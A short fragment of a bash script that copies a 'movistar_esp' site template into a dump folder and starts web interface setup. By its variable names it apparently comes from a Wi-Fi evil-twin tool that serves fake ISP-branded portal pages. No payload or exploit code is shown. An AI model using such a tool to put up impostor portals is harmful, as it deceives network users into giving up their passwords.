        mkdir $DUMP_PATH/data &>$flux_output_device
        cp -r $WORK_DIR/sites/movistar_esp/* $DUMP_PATH/data
  }


######################################### < INTERFACE WEB > ########################################
top && setresolution && setinterface
